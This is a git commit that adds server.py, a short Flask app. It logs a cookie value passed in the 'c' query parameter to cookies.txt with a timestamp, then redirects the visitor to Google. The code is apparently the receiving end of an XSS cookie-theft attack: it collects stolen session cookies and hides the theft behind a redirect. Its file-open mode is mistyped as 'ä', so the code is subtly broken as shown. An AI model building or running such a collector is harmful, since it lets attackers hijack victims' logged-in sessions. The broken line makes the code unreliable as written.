77517be8eef2a19d734225989d0eca5054065ec0
D4rw0rs <90106326+d4rw0rs@users.noreply.github.com>
2024-02-09 23:50:31 +0100

    Create server.py

---
+++ server.py
@@ -0,0 +1,20 @@
+from flask import Flask, request, redirect
+from datetime import datetime
+
+app = Flask(__name__) # Create instance
+
+@app.route('/') # our home URL
+def cookie():
+
+	# Grab cookie and write it to a file
+	
+	cookie = request.args.get('c')
+	f = open("cookies.txt","ä")
+	f.write(cookie + ' ' + str(datetime.now()) + '\n')
+	f.close()
+	
+	# redirect user to google
+	return redirect("https://google.com/")
+
+if __name__ == "__main__":
+	app.run(host = '0.0.0.0', port=80) # 0.0.0.0 - listen on all IPs
